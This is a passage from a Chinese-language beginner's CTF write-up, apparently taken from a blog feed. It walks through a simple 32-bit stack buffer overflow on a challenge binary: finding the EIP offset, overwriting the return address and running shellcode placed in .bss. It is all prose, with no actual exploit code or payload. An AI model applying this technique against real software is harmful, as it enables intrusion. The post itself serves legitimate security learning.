    <content type="text"><![CDATA[作为队伍里稍微会一点逆向的小白，开坑pwn也确实遇到了许多问题，暴露出很多基础知识的欠缺，直至编写本文时，编者从未在任何比赛中触碰过pwn，更多的时候是对pwn深深的“恐惧”，这也是许多人的通病，也导致精通pwn的人都被业界称为“pwn爷爷”甚至“pwn祖宗”，可见pwn在ctf领域中是一座冰山，很少有人触及，小编由于在最近的几场比赛中深深被pwn拖了后腿，因此决定在闲暇之余会一会这座“冰山”,以后的几期中，小编将记录下自己学习的历程，希望能在二进制这方面有所收获，也希望正在阅读本文的你能绕过小编踩过的坑。 今天记录一下开坑的第一个程序，虽然程序很简单，但是收获了不少东西 首先我们拿到一个名为icecream的Linux下可执行ELF文件，用file命令查看文件属性 可以看到这是一个32位程序 接着我们检查一下程序开启了哪些保护措施 接下来我们来运行程序 程序很简单，给了我们一个输入点 ，这其实是一个最简单的溢出问题，如果有接触过c语言的小伙伴们在编写程序时，当一个输入点超出了接收函数的处理范围，就会造成诸如卡死、闪退、乱码的情况。而本例的思路也很常规，即通过可控输入点，令输入字符串长度足以覆写掉函数返回地址（EIP），使得函数执行完毕后自动跳转到我们需要其跳转到的地址，这样我们就可以执行我们的shellcode,pwn掉程序。 下面我们来判断一下输入点距离EIP需要填充多少个字符串 运行程序 运行到输入点，输入刚刚生成的字符串 提示了无效的返回地址 这样我们就得到了返回地址，下面计算一下输入点到EIP的偏移量 我们需要将shellcode保存到bss段中，bss段的地址可以在ida中查看 可以看到执行shellcode成功]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
